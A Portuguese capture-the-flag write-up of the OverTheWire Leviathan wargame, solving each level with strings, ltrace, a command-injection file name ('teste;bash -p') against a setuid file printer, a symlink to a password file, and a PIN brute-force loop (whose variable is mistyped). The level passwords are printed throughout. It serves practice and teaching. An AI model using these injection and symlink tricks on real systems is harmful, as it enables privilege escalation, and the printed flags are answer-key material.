# Leviathan - The lord of the Seas.
## You can find this CTF on https://overthewire.org/wargames/leviathan/

por **Bruno *"Space_Cowb0y"* Carvalho**

### Leviathan0

É descrito que todas as informações dos problemas estão em suas respectivas /home/

> ls -asl

nos revela uma pasta de nome .backup contendo um arquivo html "bookmarks.html" com muitas entradas.

> cat bookmarks.html | grep "passwords"

```
 <DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

**Flag**
> rioGegei8m


### Leviathan1

>ls -asl

nos revela um executavel

```
total 28
4 drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
4 drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
4 -rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
4 -rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
8 -r-sr-x---  1 leviathan2 leviathan1 7452 Aug 26  2019 check
4 -rw-r--r--  1 root       root        675 May 15  2017 .profile
```

>./check 
```
leviathan1@leviathan:~$ ./check
password: teste
Wrong password, Good Bye ...
leviathan1@leviathan:~$      
```

Meu primeiro pensamento foi usar o gdb e tentar um reverse no codigo.
mas depois de mexer um pouco no gdb sem muito sucesso eu achei melhor simplificar

> strings ./check

```
leviathan1@leviathan:~$ strings ./check
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
puts
setreuid
printf
getchar
system
geteuid
strcmp
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRhp
QVh;
secrf
love
UWVS
t$,U
[^_]
password:
/bin/sh
Wrong password, Good Bye ...
;*2$"

```

Beleza! temos não só uma, como duas strings que podem ser usadas, love e secrf! 

Mas para ambas...

> Wrong password, Good Bye ...

OK! hora de virar o boné e executar o strace

> strace ./check

e nada... aparentemete ele não faz chamadas de sistema somente da linguagem, bem pelo menos o gdb ajudou e eu sei que ele usa c pela função printf() e strcmp()

então vamos ao ltrace

>ltrace ./check

Et vóila...

```
leviathan1@leviathan:~$ ltrace ./check
__libc_start_main(0x804853b, 1, 0xffffd794, 0x8048610 <unfinished ...>
printf("password: ")                                                      = 10
getchar(1, 0, 0x65766f6c, 0x646f6700password: love
)                                     = 108
getchar(1, 0, 0x65766f6c, 0x646f6700)                                     = 111
getchar(1, 0, 0x65766f6c, 0x646f6700)                                     = 118
strcmp("lov", "sex")                                                      = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                      = 29
+++ exited (status 0) +++
leviathan1@leviathan:~$

```

É obvio...sex!


![Hacker`s cracking passwords](https://kylerank.in/talks/security/3_common_passwords.gif)

Hora de pegar a flag!

```
leviathan1@leviathan:~$ ./check
password: sex
$   
```
Peralá um shell?... !

ok.

>$ id
>uid=12002(leviathan2) gid=12001(leviathan1) groups=12001(leviathan1)


>$ cat /etc/leviathan*/leviathan2   



**Flag**

>ougahZi8Ta

### Leviathan2

> ls -asl

```
total 28
4 drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
4 drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
4 -rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
4 -rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
8 -r-sr-x---  1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
4 -rw-r--r--  1 root       root        675 May 15  2017 .profile
```

Outro executavel.. ok, sem preguiça! >=D


> ./printfile
```
*** File Printer ***
Usage: ./printfile filename
```

huumm... ok vamos ao teste

>touch /tmp/teste && echo oi >> /tmp/teste && ./printfile /tmp/teste

```
oi
oi
```

Apaentemente ele só imprime arquivos...

>leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3

```
You cant have that file...
```

Seria fácil demais ? hahaha

>leviathan2@leviathan:~$ ltrace ./printfile /tmp/teste

```
__libc_start_main(0x804852b, 2, 0xffffd774, 0x8048610 <unfinished ...>
access("/tmp/teste", 4)                                                   = 0
snprintf("/bin/cat /tmp/teste", 511, "/bin/cat %s", "/tmp/teste")         = 19
geteuid()                                                                 = 12002
geteuid()                                                                 = 12002
setreuid(12002, 12002)                                                    = 0
system("/bin/cat /tmp/teste"oi
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                    = 0
+++ exited (status 0) +++
leviathan2@leviathan:~$  
```

ele pega o uid de quem está executanto, isso impede que eu leia arquivos que não sejam do meu usuario... porem...
Opa! ele chama /bin/cat e isso é maravilhoso! Porque ? 

Bem... o cat funciona de um jeito diferente ele permite ler dois arquivos de uma vez.

>leviathan2@leviathan:~$ touch "teste;bash -p"

>leviathan2@leviathan:~$ cd /tmp

>leviathan2@leviathan:/tmp$ /home/leviathan2/printfile "teste;bash -p"

e junto com o nosso programa permite que eu execute um bash como um usuario de permisão mais alta ;D

>leviathan3@leviathan:/tmp$   

>leviathan3@leviathan:/tmp$ cat /etc/leviathan_pass/leviathan3

**Flag**
>Ahdiemoo1j


### Leviathan3


>leviathan3@leviathan:~$ ls
```
level3
```
AAAAAAA mais um executavel!

>leviathan3@leviathan:~$ ./level3
```
Enter the password> sex
bzzzzzzzzap. WRONG
```

huuum... ltrace ?

>leviathan3@leviathan:~$ ltrace ./level3
```
__libc_start_main(0x8048618, 1, 0xffffd794, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")                                                = -1
printf("Enter the password> ")                                            = 20
fgets(Enter the password> sex
"sex\n", 256, 0xf7fc55a0)                                           = 0xffffd5a0
strcmp("sex\n", "snlprintf\n")                                            = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                = 19
+++ exited (status 0) +++
```

EZ

>leviathan3@leviathan:~$ ./level3
```
Enter the password> snlprintf
[You've got shell]!
$ cat /etc/leviathan*/leviathan4
```

**Flag**
>vuH0coox6m



### Leviathan4

![Denovo](https://opinioesemsintoniapirata.files.wordpress.com/2019/04/e-la-vamos-nos-1.jpg)

> leviathan4@leviathan:~$ ls -asl

humm... lixeira ? 

```
total 24
4 drwxr-xr-x  3 root root       4096 Aug 26  2019 .
4 drwxr-xr-x 10 root root       4096 Aug 26  2019 ..
4 -rw-r--r--  1 root root        220 May 15  2017 .bash_logout
4 -rw-r--r--  1 root root       3526 May 15  2017 .bashrc
4 -rw-r--r--  1 root root        675 May 15  2017 .profile
4 dr-xr-x---  2 root leviathan4 4096 Aug 26  2019 .trash
```
>leviathan4@leviathan:~$ cd ./.trash/

>leviathan4@leviathan:~/.trash$ ls
```
bin
```

>leviathan4@leviathan:~/.trash$ ./bin
```
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
```
Binario ... ok  vamos ao python.

> leviathan4@leviathan:~/.trash$ python
```
Python 2.7.13 (default, Sep 26 2018, 18:42:22)
[GCC 6.3.0 20170516] on linux2
Type "help", "copyright", "credits" or "license" for more information.
$>>> import binascii
$>>> n = int('0101010001101001011101000110100000110100011000110110111101101011011001010110100100
001010',2)
$>>> binascii.unhexlify('%x' % n)
'Tith4cokei\n'
```

**Flag**
>Tith4cokei

### Leviathan5

> leviathan5@leviathan:~$ ls
```
leviathan5
```
Mais um executavel =(

>leviathan5@leviathan:~$ ./leviathan5
```
Cannot find /tmp/file.log
```
humm ele procura por /tmp/file.log ? será que ele escreve algo no arquivo?

>leviathan5@leviathan:~$ strings leviathan5

é nada de util... vamos ver o que o l trace traz pra gente.

>leviathan5@leviathan:~$ ltrace ./leviathan5
```
fopen("/tmp/file.log", "r")                               = 0x804b008
.
.
.
fgetc(0x804b008)                                          = '\377'
feof(0x804b008)                                           = 1
fclose(0x804b008)                                         = 0
getuid()                                                  = 12005
setuid(12005)                                             = 0
unlink("/tmp/file.log")                                   = 0
+++ exited (status 0) +++
```
ok ok ok! ele pega meu uid e set ele pro arquivo e deepois da unlink... perai unlink? se me deu uma ideia!

>leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log

>leviathan5@leviathan:~$ ./leviathan5

Boa! essa foi complicadinha!

**Flag**
>UgaoFee4li

### Leviathan6

>leviathan6@leviathan:~$ ls
```
leviathan6
```
>leviathan6@leviathan:~$ ./leviathan6
```
usage: ./leviathan6 <4 digit code>
```
>leviathan6@leviathan:~$ ./leviathan6 1337
```
Wrong
```

>for x in {0000..9999}; do ./leviathan6 $i; done
```
$
$cat /etc/levithan*/leviathan7
```

**Flag**
>ahy7MaeBo9

### Leviathan7

>leviathan7@leviathan:~$ ls
```
CONGRATULATIONS
leviathan7@leviathan:~$ cat CONGRATULATIONS
Well Done, you seem to have used a *nix system before, now try something more serious.
```